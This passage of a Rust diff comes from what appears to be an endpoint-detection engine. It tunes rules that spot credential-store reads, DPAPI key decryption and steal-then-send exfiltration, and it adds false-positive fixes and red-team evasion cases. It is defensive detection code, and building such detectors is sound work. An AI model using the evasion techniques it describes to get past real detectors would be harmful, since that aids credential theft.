+            // (never path + size), was suspended, judged and resumed
+            // `ST12_PROTECT_RESUMES` times within 7 days from an equally or
+            // more exposed folder, later runs are folded like in Audit. A new
+            // build of the tool (new hash) is judged again.
+            let fold_ok = self.mode(ST12) != RuleMode::Protect
+                || (key.starts_with("sha256:")
+                    && prev.is_some_and(|s| s.resumed >= ST12_PROTECT_RESUMES));
             self.state(&info.guid, e.ts).add_evidence(e);
             if let Some(s) = prev.filter(|_| fold_ok) {
                 if e.ts >= s.last_alert
@@ -2905,12 +3576,19 @@ impl EngineState {
                         }
                     }
                 }
+                let resumed = match prev {
+                    Some(s) if e.ts >= s.last_alert && e.ts - s.last_alert < ST12_FIRST_SEEN_MS => {
+                        s.resumed
+                    }
+                    _ => 0,
+                };
                 self.st12_seen.insert(
                     key,
                     SeenBinary {
                         last_alert: e.ts,
                         rank,
                         repeats: 0,
+                        resumed,
                     },
                 );
             }
@@ -2957,6 +3635,7 @@ impl EngineState {
                 last_alert,
                 rank: rank.clamp(1, 2),
                 repeats,
+                resumed: 0,
             });
             if last_alert > e.last_alert {
                 e.last_alert = last_alert;
@@ -3044,6 +3723,19 @@ impl EngineState {
     fn on_process_stop(&mut self, e: &Event) {
         let img = self.table.get(&e.guid).map(|p| p.image.clone());
         self.table.mark_exit(&e.guid, e.ts);
+        // FP-14: a suspended process can only exit after it was resumed (or
+        // killed by something else): count it like a resume.
+        let keys: Vec<String> = self
+            .suspends
+            .iter()
+            .filter(|w| w.guid == e.guid)
+            .filter_map(|w| w.st12_key.clone())
+            .collect();
+        for k in keys {
+            if let Some(s) = self.st12_seen.get_mut(&k) {
+                s.resumed = s.resumed.saturating_add(1);
+            }
+        }
         self.suspends.retain(|w| w.guid != e.guid);
         if let Some(img) = img {
             if is_chromium_image(&img) {
@@ -3088,6 +3780,12 @@ impl EngineState {
                 hit.extra_evidence.push(e.clone());
                 self.emit(e, hit);
             }
+            // FP-18 (fix round 2026-10-25): Brave's updater stopped Brave and
+            // the new version's elevation service started: a genuine browser
+            // installer / updater ran in the last 5 minutes and nobody asked
+            // to kill the browser.
+            None if self.last_browser_update <= e.ts
+                && e.ts.saturating_sub(self.last_browser_update) <= BROWSER_UPDATE_WINDOW_MS => {}
             None if !relaunched => {
                 let hit = Hit::new(ST08, &info.guid, Severity::Medium, format!("The browser was terminated {} times and the browser elevation service started {} ms later without the browser being relaunched; the caller could not be identified", stops.len(), e.ts - last));
                 self.state(&info.guid, e.ts).add_evidence(e);
@@ -3170,17 +3868,65 @@ impl EngineState {
     // ------------------------------------------------------------------
 
     fn on_file(&mut self, e: &Event, path: &str, op: FileOp) {
-        if !may_be_sensitive(path) {
+        // Sensor 2026-10-25: opens of any `Local State` under a profile or
+        // the process's `--user-data-dir` arrive so the engine can tell a
+        // process's own profile key from a foreign one (FP-04 / Xeno). On
+        // its own such an open never raises anything.
+        let lower_ls = path.len() >= 12
+            && path
+                .get(path.len() - 12..)
+                .is_some_and(|t| t.eq_ignore_ascii_case(r"\local state"));
+        let mut own_ls = false;
+        if lower_ls
+            && matches!(op, FileOp::Open | FileOp::Read)
+            && !self.is_agent_owned(&e.guid)
+            && e.pid != 0
+            && e.pid != 4
+        {
+            let p = self.proc_info(e);
+            let norm = normalize_path(path);
+            let tainted = self.tainted(&p.guid);
+            own_ls = self.own_profile_local_state(&p, &norm)
+                || (match_normalized(&norm)
+                    .is_some_and(|s| is_trusted_owner(&p, &s, &norm, self.system_drive, tainted))
+                    && !self.electron_hijack_suspected(&p));
+            let st = self.state(&e.guid, e.ts);
+            if own_ls {
+                st.own_ls_ts = Some(e.ts);
+            } else {
+                st.foreign_ls = true;
+            }
+        }
+        if !may_be_sensitive(path) && !crate::paths::may_be_sensitive_short(path) {
             return;
         }
-        let norm = normalize_path(path);
+        let mut norm = normalize_path(path);
         let dl = strip_drive(&norm).to_string();
         if self.check_canary(e, &dl, op) {
             return;
         }
-        let Some(store) = match_normalized(&norm) else {
-            return;
+        let store = match match_normalized(&norm) {
+            Some(s) => s,
+            // Fix round 2026-10-25 (corpus `evasion_short_name_paths`): an
+            // 8.3 short path (`USERDA~1\Default\LOGIND~1`) is the store it
+            // abbreviates.
+            None => match crate::paths::match_short_names(&norm) {
+                Some((s, long)) => {
+                    norm = long;
+                    s
+                }
+                None => return,
+            },
         };
+        // The process's own profile key (Electron / WebView2 app) is not a
+        // credential read; a foreign `Local State` stays one.
+        if own_ls && store.app == "Chromium-based browser" {
+            return;
+        }
+        // FP-13: opening a store folder (enumeration) is not a read.
+        if op == FileOp::Open && crate::paths::store_container_path(&norm) {
+            return;
+        }
         let relevant = match op {
             FileOp::Open | FileOp::Read => true,
             FileOp::Write | FileOp::Create => {
@@ -3193,6 +3939,13 @@ impl EngineState {
             return;
         }
         let proc_ = self.proc_info(e);
+        // Fix round 2026-10-25 (FP-01, PID reuse in pre-1.1.6 agents): a
+        // process cannot open files after it exited. A read stamped more than
+        // 5 s after the process's stop belongs to another process that
+        // reused the PID; it is not attributed to this one.
+        if proc_.exit_ts.is_some_and(|x| e.ts > x + 5_000) {
+            return;
+        }
         // No image at all: a process that predates the agent and that Windows
         // will not let it open (protected processes such as token-broker
         // hosts; lab VM). New processes always arrive with their image (the
@@ -3229,45 +3982,65 @@ impl EngineState {
         // Microsoft-signed Program Files apps are WAM clients of the token
         // broker cache (not when running a script).
         let tampered = self.tampered.contains(&proc_.guid);
-        if is_trusted_owner(&proc_, &store)
-            || crate::legit_apps::browser_store_owner(
-                &proc_,
-                store.app,
-                self.system_drive,
-                tampered,
-            )
-            .is_some()
-            || crate::legit_apps::bundled_cli_python(&proc_, store.app, self.system_drive, tampered)
-            || benign_reader_for(&proc_, &store, &norm).is_some()
-            || Self::system_trusted(&proc_)
+        let sd = self.system_drive;
+        // Red-team round 2: a genuine browser launched by an untrusted
+        // process (a possible early-bird injection) owns only its own
+        // vendor's stores, not every browser's.
+        let foreign_for_launched = matches!(
+            store.owner,
+            crate::paths::OwnerApp::Chromium | crate::paths::OwnerApp::Firefox
+        ) && identity::genuine_browser(&proc_, sd, tampered)
+            && !Self::same_vendor_store(&proc_.image, &norm)
+            && self.launched_by_untrusted(&proc_);
+        // Review 1.1.7 M3: never for an Electron owner that may be running
+        // attacker code (script / eval / inspector argument, untrusted
+        // launcher).
+        let electron_hijack = self.electron_hijack_suspected(&proc_);
+        if (is_trusted_owner(&proc_, &store, &norm, sd, tampered)
+            && !foreign_for_launched
+            && !electron_hijack)
+            || (crate::paths::own_embedded_profile(&proc_, &store, &norm, sd, tampered)
+                && !electron_hijack)
+            || crate::legit_apps::browser_store_owner(&proc_, store.app, sd, tampered).is_some()
+            || crate::legit_apps::bundled_cli_python(&proc_, store.app, sd, tampered)
+            || benign_reader_for(&proc_, &store, &norm, sd, tampered).is_some()
+            || self.system_reader_ok(&proc_, &store)
         {
             return;
         }
         if self.excluded(&proc_, ST01, e.ts) || self.iocs.allowed_process(&proc_) {
             return;
         }
-        let benign = if crate::legit_apps::wam_client_reader(&proc_, store.app, self.system_drive) {
-            BenignRead::Wam
-        } else if crate::legit_apps::dev_tool_reader(&proc_, store.app, self.system_drive, tampered)
-        {
-            BenignRead::DevTool
-        } else if crate::legit_apps::ms_wam_reader_per_user(
-            &proc_,
-            store.app,
-            self.system_drive,
-            tampered,
-        ) {
-            BenignRead::WamPerUser
-        } else if crate::legit_apps::vendor_config_reader(
-            &proc_,
-            &store,
-            self.system_drive,
-            tampered,
-        ) {
-            BenignRead::VendorConfig
-        } else {
-            BenignRead::No
-        };
+        let benign =
+            if crate::legit_apps::wam_client_reader(&proc_, store.app, self.system_drive, tampered)
+            {
+                BenignRead::Wam
+            } else if crate::legit_apps::dev_tool_reader(
+                &proc_,
+                store.app,
+                self.system_drive,
+                tampered,
+            ) {
+                BenignRead::DevTool
+            } else if crate::legit_apps::ms_wam_reader_per_user(
+                &proc_,
+                store.app,
+                self.system_drive,
+                tampered,
+            ) {
+                BenignRead::WamPerUser
+            } else if crate::legit_apps::vendor_config_reader(
+                &proc_,
+                &store,
+                self.system_drive,
+                tampered,
+            ) {
+                BenignRead::VendorConfig
+            } else if crate::paths::own_folder_reader(&proc_, &store, &norm, sd, tampered) {
+                BenignRead::OwnFolder
+            } else {
+                BenignRead::No
+            };
         self.on_sensitive_read(e, &proc_, &store, op, benign);
     }
 
@@ -3285,7 +4058,11 @@ impl EngineState {
             BenignRead::DevTool => st.dev_tool_cred = true,
             BenignRead::WamPerUser => st.ms_wam_cred = true,
             BenignRead::VendorConfig => st.vendor_cfg_cred = true,
-            BenignRead::No => st.non_wam_cred = true,
+            BenignRead::OwnFolder => st.own_folder_cred = true,
+            BenignRead::No => {
+                st.non_wam_cred = true;
+                st.file_cred = true;
+            }
         }
         match (
             crate::legit_apps::cloud_provider(store.app),
@@ -3366,6 +4143,14 @@ impl EngineState {
                     proc_.signer.as_deref().unwrap_or("").trim()
                 ));
             }
+            BenignRead::OwnFolder => {
+                hit.severity = Severity::Low;
+                hit.mode_override = Some(RuleMode::Audit);
+                hit.summary.push_str(&format!(
+                    " (validly signed \"{}\" image in the store's own application folder; its publisher is not in Kestrel's signer table, so this is recorded and a later send is judged by destination; alert only)",
+                    proc_.signer.as_deref().unwrap_or("").trim()
+                ));
+            }
             BenignRead::No => {
                 hit.suspend = true;
                 hit.kill_at_expiry = kill_at_expiry;
@@ -3394,6 +4179,13 @@ impl EngineState {
                 hit.actions.push(quarantine(proc_));
             }
             self.emit(e, hit);
+        }
+        if benign == BenignRead::No {
+            if let Some(root) =
+                self.record_tree_read(proc_, store.app, store.noun, store.category, e.ts)
+            {
+                self.check_tree_st02(e, &root);
+            }
         }
     }
 
@@ -3472,7 +4264,8 @@ impl EngineState {
         // known-app table): only outside user-writable locations (a signed
         // browser binary copied to AppData is not one), never at a known
         // app's location with the wrong signer, never remote-controlled.
-        let owner_read = store.as_ref().is_some_and(|s| is_trusted_owner(&proc_, s))
+        let owner_read = store.as_ref().is_some_and(|s| is_trusted_owner(&proc_, s, dl, self.system_drive, self.tampered.contains(&proc_.guid)))
+            && !self.electron_hijack_suspected(&proc_)
             // Re-review N4: a positive list; `C:\<new folder>` (Other) is
             // user-creatable and never counts.
             && matches!(
@@ -3541,11 +4334,17 @@ impl EngineState {
         }
         let proc_ = self.proc_info(e);
         let name = file_name_lower(&proc_.image);
-        let trusted = !is_untrusted_location_or_signature(&proc_);
-        if trusted && (is_browser_image(&name) || name == "elevation_service.exe") {
+        let tampered = self.tampered.contains(&proc_.guid);
+        let sd = self.system_drive;
+        // Fix round 2026-10-25: a genuine browser (identity, not name); a
+        // browser launched by an untrusted process only for its own key.
+        let own_key = normalize_path(&proc_.image).contains(&browser.to_ascii_lowercase());
+        if (identity::genuine_browser(&proc_, sd, tampered)
+            && (own_key || !self.launched_by_untrusted(&proc_)))
+            || (name == "elevation_service.exe" && identity::genuine(&proc_, sd, tampered))
+        {
             return;
         }
-        let tampered = self.tampered.contains(&proc_.guid);
         if crate::legit_apps::browser_store_owner(&proc_, browser, self.system_drive, tampered)
             .is_some()
         {
@@ -3558,10 +4357,44 @@ impl EngineState {
             noun: "DPAPI-protected secrets",
             owners: &[],
         };
-        if benign_reader_for(&proc_, &pseudo, "").is_some()
+        if benign_reader_for(&proc_, &pseudo, "", sd, tampered).is_some()
             || self.excluded(&proc_, ST03, e.ts)
             || self.iocs.allowed_process(&proc_)
         {
+            return;
+        }
+        // Fix round 2026-10-25: anything foreign read by the process or its
+        // untrusted tree in the last 10 minutes (a browser / wallet store,
+        // another profile's `Local State`) rules out an own-key decrypt.
+        let recent = |t: TimestampMs| t <= e.ts && e.ts - t <= 10 * 60 * 1000;
+        let foreign_self = self
+            .states
+            .get(&proc_.guid)
+            .is_some_and(|s| s.non_wam_cred || s.foreign_ls);
+        let foreign_tree = self
+            .tree_keys(&proc_.guid)
+            .iter()
+            .any(|k| self.tree.get(k).is_some_and(|c| recent(c.last_ts)));
+        // FP-04 / Xeno with the 2026-10-25 sensor evidence: the "Chromium"
+        // decrypt follows a read of the process's own profile `Local State`
+        // and nothing foreign: the app's own safeStorage key. Info, Audit,
+        // not a credential signal (no ST-02 category, no ST-04).
+        let own_evidence = browser == "Chromium"
+            && !tampered
+            && !foreign_self
+            && !foreign_tree
+            && self
+                .states
+                .get(&proc_.guid)
+                .and_then(|s| s.own_ls_ts)
+                .is_some_and(recent);
+        if own_evidence {
+            let st = self.state(&proc_.guid, e.ts);
+            st.own_app_dpapi = true;
+            st.add_evidence(e);
+            let mut hit = Hit::new(ST03, &proc_.guid, Severity::Info, format!("{} used Windows DPAPI to decrypt a \"Chromium\" key right after reading its own profile's Local State and no other browser's: the app's own Electron / Chromium safeStorage key", describe(&proc_)));
+            hit.mode_override = Some(RuleMode::Audit);
+            self.emit(e, hit);
             return;
         }
         // Lab 2026-10-21: Electron apps (VS Code, …) unprotect their own
@@ -3569,16 +4402,26 @@ impl EngineState {
         // validly signed, non-browser, non-script-host image under Program
         // Files / WindowsApps that has not read any other credential store:
         // Low / Audit, still recorded (ST-04 then stays Audit too).
+        // FP-04 (fix round 2026-10-25): per-user installs of listed
+        // publishers (Discord, VS Code in AppData) are their own apps too;
+        // identity replaces "under Program Files", and nothing foreign may
+        // have been read by the process or its tree.
         let own_app = browser == "Chromium"
-            && proc_.signed == SignatureState::Valid
-            && crate::legit_apps::in_program_files(&proc_.image, self.system_drive)
+            && identity::genuine(&proc_, sd, tampered)
+            && (crate::legit_apps::in_program_files(&proc_.image, sd)
+                || identity::publishers_for(&name).next().is_some())
             && !is_browser_image(&name)
             && !is_lolbin(&name)
-            && !crate::legit_apps::SCRIPT_HOSTS.contains(&name.as_str())
-            && !crate::legit_apps::MACRO_HOSTS.contains(&name.as_str())
-            && !tampered
-            && !self.states.get(&proc_.guid).is_some_and(|s| s.non_wam_cred);
+            && !crate::legit_apps::is_interpreter(&name)
+            && !crate::legit_apps::is_remote_controlled(&proc_.cmdline)
+            && !foreign_self
+            && !foreign_tree;
         let st = self.state(&proc_.guid, e.ts);
+        if browser == "Chromium" {
+            st.dpapi_chromium = true;
+        } else {
+            st.dpapi_named = true;
+        }
         st.add_category(DataCategory::BrowserMasterKey, e.ts);
         st.touch(browser, "DPAPI-protected secrets");
         st.add_evidence(e);
@@ -3600,12 +4443,23 @@ impl EngineState {
         if own_app {
             hit.severity = Severity::Low;
             hit.mode_override = Some(RuleMode::Audit);
-            hit.summary.push_str(" (description \"Chromium\" from a signed Program Files app: Electron's own safeStorage key; alert only)");
+            hit.summary.push_str(" (description \"Chromium\" from a genuine installed app that read nothing foreign: Electron's own safeStorage key; alert only)");
         } else {
             hit.suspend = true;
             hit.kill_at_expiry = kill_at_expiry;
         }
         self.emit(e, hit);
+        if !own_app {
+            if let Some(root) = self.record_tree_read(
+                &proc_,
+                browser,
+                "DPAPI-protected secrets",
+                DataCategory::BrowserMasterKey,
+                e.ts,
+            ) {
+                self.check_tree_st02(e, &root);
+            }
+        }
         if ncat >= ST02_MIN_CATEGORIES {
             let mut hit = Hit::new(
                 ST02,
@@ -3636,7 +4490,9 @@ impl EngineState {
 
     fn domain_owner_ok(&self, p: &ProcessInfo, host: &str) -> bool {
         let name = file_name_lower(&p.image);
-        !is_untrusted_location_or_signature(p)
+        // Fix round 2026-10-25: the domain's own client by identity
+        // (corpus `evasion_stolen_cert_named_discord_update`).
+        identity::genuine(p, self.system_drive, self.tainted(&p.guid))
             && DOMAIN_OWNERS
                 .iter()
                 .any(|(d, imgs)| host_matches(host, d) && imgs.contains(&name.as_str()))
@@ -3714,7 +4570,8 @@ impl EngineState {
                 .get(&e.guid)
                 .and_then(|s| s.dns.get(&ip_norm).cloned())
         });
-        let browser = is_browser_image(&proc_.image) && !is_untrusted_location_or_signature(&proc_);
+        let browser =
+            identity::genuine_browser(&proc_, self.system_drive, self.tainted(&proc_.guid));
 
         // IOCs
         let ioc = self.iocs.by_ip(dst_ip).cloned().or_else(|| {
@@ -3803,54 +4660,177 @@ impl EngineState {
             self.emit(e, hit);
         }
 
-        // ST-04 steal-then-send (same process, or its parent/children when one of them read the secrets)
+        // ST-04 steal-then-send.
         if browser {
             return;
         }
-        let mut readers: Vec<ProcessGuid> = vec![proc_.guid.clone()];
-        // Relatives only when the connecting process is itself untrusted-ish: a trusted
-        // Windows binary (explorer, svchost) connecting out says nothing about its children.
-        if !Self::system_trusted(&proc_) && !self.protected(&proc_) {
-            if let Some(p) = self.table.parent_of(&proc_) {
-                if !Self::system_trusted(p) && !is_browser_image(&p.image) {
-                    readers.push(p.guid.clone());
+        self.st04(e, &proc_, ip_norm, dst_port, host);
+    }
+
+    /// ST-04 steal-then-send. Fix round 2026-10-25 (corpus finding 5):
+    /// the reader is looked up in the sender itself, its parent and every
+    /// descendant (any credential read), the sender's untrusted process tree
+    /// (a reader up to the first trusted ancestor, siblings and cousins
+    /// included, even after it exited: GUID keyed), and for the BITS service
+    /// the trees that created a BITS upload job. Reads within 5 minutes, or
+    /// within 30 minutes when the connection already sent 64 KB or more.
+    /// Readers with non-benign reads win over benign ones (a signed app's
+    /// own key no longer shadows its child that read the real stores).
+    fn st04(
+        &mut self,
+        e: &Event,
+        proc_: &ProcessInfo,
+        ip_norm: String,
+        dst_port: u16,
+        host: Option<String>,
+    ) {
+        let (udp, bytes) = match &e.data {
+            EventData::NetConnect {
+                proto, bytes_sent, ..
+            } => (*proto == NetProto::Udp, *bytes_sent),
+            _ => (false, None),
+        };
+        // Xeno (DETECTION-QUALITY.md section 5): one QUIC Initial is a
+        // handshake, not an upload; the flow is reported again at 64 KB.
+        if udp && dst_port == 443 && bytes.is_some_and(|b| b <= QUIC_INITIAL_MAX_BYTES) {
+            return;
+        }
+        let slow_ok = bytes.is_some_and(|b| b >= ST04_SLOW_MIN_BYTES);
+        let ip_s = ip_norm.clone();
+        let now = e.ts;
+        let in_window = |t: TimestampMs| {
+            t <= now && (now - t <= ST04_WINDOW_MS || (slow_ok && now - t <= ST04_SLOW_WINDOW_MS))
+        };
+        let sender_tainted = self.tainted(&proc_.guid);
+        let bits = Self::bits_host(proc_);
+        let sender_trusted =
+            (Self::system_trusted(proc_) && !sender_tainted) || self.protected(proc_);
+        // (guid, non-benign reads, rank: 0 self, 1 parent / descendant, 2 tree / BITS)
+        let mut cands: Vec<(ProcessGuid, bool, u8)> = Vec::new();
+        let push_state = |st: &HashMap<ProcessGuid, ProcState>,
+                          g: &ProcessGuid,
+                          rank: u8,
+                          cands: &mut Vec<(ProcessGuid, bool, u8)>| {
+            if let Some(s) = st.get(g) {
+                if let Some(t) = s.cred_ts() {
+                    if in_window(t) && !cands.iter().any(|c| &c.0 == g) {
+                        cands.push((g.clone(), s.non_wam_cred, rank));
+                    }
                 }
             }
-            for c in self.table.children_of(&proc_.guid) {
-                readers.push(c.guid.clone());
+        };
+        push_state(&self.states, &proc_.guid, 0, &mut cands);
+        if !sender_trusted {
+            if let Some(p) = self.table.parent_of(proc_) {
+                let pt = self.tainted(&p.guid);
+                if !(Self::system_trusted(p) && !pt)
+                    && !identity::genuine_browser(p, self.system_drive, pt)
+                {
+                    push_state(&self.states, &p.guid, 1, &mut cands);
+                }
+            }
+            // Direct children with any read; deeper descendants only with
+            // non-benign reads (an allowance covers the reader and its own
+            // vendor's sends, never an unrelated ancestor's traffic).
+            for c in self.table.descendants_all(&proc_.guid, 256) {
+                let direct = c.parent_guid.as_ref() == Some(&proc_.guid);
+                if direct || self.states.get(&c.guid).is_some_and(|s| s.non_wam_cred) {
+                    push_state(&self.states, &c.guid, 1, &mut cands);
+                }
+            }
+            for k in self.tree_keys(&proc_.guid) {
+                if let Some(c) = self.tree.get(&k) {
+                    if c.linkable()
+                        && in_window(c.last_ts)
+                        && !cands.iter().any(|x| x.0 == c.reader)
+                    {
+                        cands.push((c.reader.clone(), true, 2));
+                    }
+                }
             }
         }
-        let reader = readers.into_iter().find_map(|g| {
-            let t = self.states.get(&g)?.cred_ts()?;
-            (t <= e.ts && e.ts - t <= ST04_WINDOW_MS).then_some(g)
-        });
-        let Some(rg) = reader else { return };
-        let rp = self.table.get(&rg).cloned().unwrap_or_else(|| {
-            if rg == proc_.guid {
-                proc_.clone()
-            } else {
-                placeholder(&rg, 0, e.ts)
+        if bits {
+            let creators: Vec<ProcessGuid> = self
+                .bits_jobs
+                .iter()
+                .filter(|(t, _)| *t <= now && now - t <= BITS_JOB_TTL_MS)
+                .map(|(_, g)| g.clone())
+                .collect();
+            for g in creators {
+                push_state(&self.states, &g, 2, &mut cands);
+                for k in self.tree_keys(&g) {
+                    if let Some(c) = self.tree.get(&k) {
+                        if in_window(c.last_ts) && !cands.iter().any(|x| x.0 == c.reader) {
+                            cands.push((c.reader.clone(), true, 2));
+                        }
+                    }
+                }
             }
+        }
+        // Non-benign readers first, then the closest relative.
+        cands.sort_by_key(|c| (!c.1, c.2));
+        let Some((rg, _, rank)) = cands.into_iter().next() else {
+            return;
+        };
+        let tree_info = self.tree_keys(&rg).into_iter().find_map(|k| {
+            self.tree
+                .get(&k)
+                .filter(|c| c.reader == rg)
+                .map(|c| (c.reader_info.clone(), c.touched.clone(), c.last_ts))
         });
-        let (phrase, delay) = {
-            let st = self.state(&rg, e.ts);
-            (
+        let rp = self
+            .table
+            .get(&rg)
+            .cloned()
+            .or_else(|| tree_info.as_ref().and_then(|t| t.0.clone()))
+            .unwrap_or_else(|| {
+                if rg == proc_.guid {
+                    proc_.clone()
+                } else {
+                    placeholder(&rg, 0, e.ts)
+                }
+            });
+        let (phrase, delay) = match self.states.get(&rg).filter(|s| !s.touched.is_empty()) {
+            Some(st) => (
                 stores_phrase(&st.touched),
                 fmt_secs(e.ts - st.cred_ts().unwrap_or(e.ts)),
-            )
+            ),
+            None => match &tree_info {
+                Some((_, touched, t)) => (stores_phrase(touched), fmt_secs(e.ts - *t)),
+                None => ("credential stores".to_string(), String::new()),
+            },
         };
         let dest = match &host {
             Some(h) => format!("{ip_norm}:{dst_port} ({h})"),
             None => format!("{ip_norm}:{dst_port}"),
         };
+        let sender_is_parent = rg != proc_.guid
+            && (rp.parent_guid.as_ref() == Some(&proc_.guid)
+                || self
+                    .table
+                    .parent_of(&rp)
+                    .is_some_and(|p| p.guid == proc_.guid));
+        let sender_is_child = rg != proc_.guid
+            && (proc_.parent_guid.as_ref() == Some(&rg)
+                || self.table.parent_of(proc_).is_some_and(|p| p.guid == rg));
         let who = if rg == proc_.guid {
             "then connected to".to_string()
-        } else if proc_.parent_guid.as_ref() == Some(&rg)
-            || self.table.parent_of(&proc_).is_some_and(|p| p.guid == rg)
-        {
-            format!("then its child {} connected to", short_name(&proc_))
+        } else if bits {
+            format!(
+                "created a BITS upload job, then the BITS service ({}) uploaded to",
+                short_name(proc_)
+            )
+        } else if sender_is_child {
+            format!("then its child {} connected to", short_name(proc_))
+        } else if sender_is_parent {
+            format!("then its parent {} connected to", short_name(proc_))
+        } else if rank == 1 {
+            format!("then its ancestor {} connected to", short_name(proc_))
         } else {
-            format!("then its parent {} connected to", short_name(&proc_))
+            format!(
+                "then {} in the same untrusted process tree connected to",
+                short_name(proc_)
+            )
         };
         let mut hit = Hit::new(
             ST04,
@@ -3862,38 +4842,22 @@ impl EngineState {
             ),
         );
         // Owner's PC 2026-10-22: the send came from the reader's *parent*
-        // and that parent is the same vendor's signed Program Files backend
-        // (Docker Desktop's com.docker.backend.exe contacting
-        // desktop.docker.com): the parent and its tree are not killed and
-        // the vendor's endpoint is not blocked; only the reader is stopped.
-        let sender_is_parent = rg != proc_.guid
-            && (rp.parent_guid.as_ref() == Some(&proc_.guid)
-                || self
-                    .table
-                    .parent_of(&rp)
-                    .is_some_and(|p| p.guid == proc_.guid));
+        // and that parent is the same vendor's signed Program Files backend.
         let vendor_backend = sender_is_parent
-            && crate::legit_apps::vendor_backend(
-                &proc_,
-                &rp,
-                self.system_drive,
-                self.tampered.contains(&proc_.guid),
-            );
+            && crate::legit_apps::vendor_backend(proc_, &rp, self.system_drive, sender_tainted);
         hit.actions.push(kill(&rp, true));
-        if rg != proc_.guid && !vendor_backend {
-            hit.actions.push(kill(&proc_, true));
+        if rg != proc_.guid && !vendor_backend && !bits && !sender_trusted {
+            hit.actions.push(kill(proc_, true));
             if proc_.path_class.is_user_writable() {
-                hit.actions.push(quarantine(&proc_));
+                hit.actions.push(quarantine(proc_));
             }
         }
         if !vendor_backend {
             // Block scope: a validly signed sender installed under Program
-            // Files gets a per-image block (it is killed anyway); a CDN
-            // address it shares with other software (3.165.102.21 is
-            // CloudFront) is not cut for the whole host for 24 h. Anything
-            // else (unsigned, user-writable, System32 LOLBins) keeps the
-            // host-wide block.
-            let scope = (proc_.signed == SignatureState::Valid
+            // Files gets a per-image block; the BITS service and anything
+            // else a host-wide block.
+            let scope = (!bits
+                && proc_.signed == SignatureState::Valid
                 && crate::legit_apps::in_program_files(&proc_.image, self.system_drive))
             .then(|| proc_.image.clone());
             hit.actions.push(ResponseAction::BlockDestination {
@@ -3907,74 +4871,130 @@ impl EngineState {
         } else {
             hit.summary.push_str(&format!(
                 " (the connection came from {}, the reader's parent, signed by the same vendor and installed under Program Files: only the reader is stopped, the parent and the destination are left alone)",
-                short_name(&proc_)
+                short_name(proc_)
             ));
         }
         hit.actions.push(quarantine(&rp));
-        // Re-review N2: only WAM token-cache reads by a Microsoft-signed WAM
-        // client (e.g. VS Code sign-in, then telemetry): Audit, not a kill.
-        // Owner's PC 2026-10-22: likewise developer-tool credential stores
-        // read only by signed Program Files developer tools.
-        // Triage 2026-10-22 item 6: a per-user Microsoft-signed WAM client
-        // (VS Code under %LOCALAPPDATA%) is only Audit when the send went to
-        // Microsoft's own sign-in / telemetry endpoints (by DNS name) from a
-        // Microsoft-signed, untampered sender; anything else is the full
-        // response.
-        let ms_host = host
+
+        // Destination class (fix round 2026-10-25): an allowance for benign
+        // reads never covers a raw IP (no DNS name) or a dead-drop /
+        // exfiltration service.
+        let host_l = host.as_deref().map(|h| h.trim_end_matches('.').to_string());
+        let raw = host_l.is_none();
+        let exfil = host_l
             .as_deref()
-            .filter(|h| crate::legit_apps::microsoft_endpoint(h))
-            .map(|h| h.trim_end_matches('.').to_string());
-        let ms_send_ok = ms_host.is_some()
-            && crate::legit_apps::microsoft_sender_ok(&proc_, self.tampered.contains(&proc_.guid))
-            && crate::legit_apps::microsoft_sender_ok(&rp, self.tampered.contains(&rg));
-        if let Some(s) = self.states.get(&rg).filter(|s| {
-            (s.wam_cred || s.own_app_dpapi || s.dev_tool_cred || s.ms_wam_cred || s.vendor_cfg_cred)
-                && !s.non_wam_cred
-                && (!s.ms_wam_cred || ms_send_ok)
-        }) {
-            // Triage item 5: Audit because the reads were benign, so the
-            // severity is Low (it was Critical and flooded the incident
-            // queue). Review H4: developer-tool stores and Steam's
-            // config.vdf are Low only when the reader itself or its
-            // same-vendor backend sent the data, or it went to that store's
-            // provider endpoint; a different sender (git-remote-https
-            // pushing a committed `.aws\credentials`) stays High Audit. The
-            // provider-endpoint branch below stays High.
+            .is_some_and(|h| self.exfil_match(h).is_some() && !self.domain_owner_ok(proc_, h));
+        let rg_tainted = self.tainted(&rg);
+        let ms_senders_ok = crate::legit_apps::microsoft_sender_ok(proc_, sender_tainted)
+            && crate::legit_apps::microsoft_sender_ok(&rp, rg_tainted);
+        let benign_verdict: Option<(Severity, String)> = match self.states.get(&rg) {
+            Some(s)
+                if (s.wam_cred
+                    || s.own_app_dpapi
+                    || s.dev_tool_cred
+                    || s.ms_wam_cred
+                    || s.vendor_cfg_cred
+                    || s.own_folder_cred)
+                    && !s.non_wam_cred
+                    && !exfil =>
+            {
+                let h = host_l.clone().unwrap_or_default();
+                let mut worst = Severity::Low;
+                let mut notes: Vec<String> = Vec::new();
+                let mut full = false;
+                if raw && (s.wam_cred || s.dev_tool_cred || s.vendor_cfg_cred) {
+                    // No DNS name for the destination (DoH, a reused
+                    // connection, or a hard-coded address): never Low.
+                    worst = Severity::High;
+                    notes.push(format!(
+                        "the destination {ip_s} has no DNS name Kestrel saw; review"
+                    ));
+                }
+                if s.ms_wam_cred {
+                    if ms_senders_ok
+                        && (crate::legit_apps::microsoft_endpoint(&h)
+                            || crate::legit_apps::github_signin_host(&h)
+                            || crate::legit_apps::github_copilot_host(&h))
+                    {
+                        notes.push(format!("the Windows sign-in (WAM) token cache was read by a Microsoft-signed app and the connection went to its own sign-in endpoint {h}"));
+                    } else if ms_senders_ok && crate::legit_apps::extension_telemetry_host(&h) {
+                        // Owner export 2026-10-25: VS Code extensions post
+                        // telemetry to Azure Application Insights; anyone can
+                        // own an ingestion key there, so never Low.
+                        worst = worst.max(Severity::High);
+                        notes.push(format!("the Windows sign-in (WAM) token cache was read by a Microsoft-signed app, then it posted to the telemetry ingestion service {h} (shared by extension telemetry and any Application Insights owner); review"));
+                    } else if ms_senders_ok && h.eq_ignore_ascii_case("api.github.com") {
+                        // FP-03: VS Code's GitHub sign-in calls the API too;
+                        // the API can also create gists, so never Low.
+                        worst = worst.max(Severity::High);
+                        notes.push("the Windows sign-in (WAM) token cache was read by a Microsoft-signed app, then it called api.github.com (GitHub sign-in uses it, and so can a gist upload); review".to_string());
+                    } else {
+                        full = true;
+                    }
+                }
+                if s.wam_cred && !raw {
+                    if crate::legit_apps::microsoft_first_party(&h) {
+                        notes.push(format!("the Windows sign-in (WAM) token cache was read by a Microsoft-signed Program Files app and the connection went to the Microsoft service {h}"));
+                    } else {
+                        worst = worst.max(Severity::High);
+                        notes.push(format!("the Windows sign-in (WAM) token cache was read by a Microsoft-signed Program Files app, but {h} is not a Microsoft service; review"));
+                    }
+                }
+                if s.dev_tool_cred && !raw {
+                    let provider_ep = s
+                        .cloud_provider
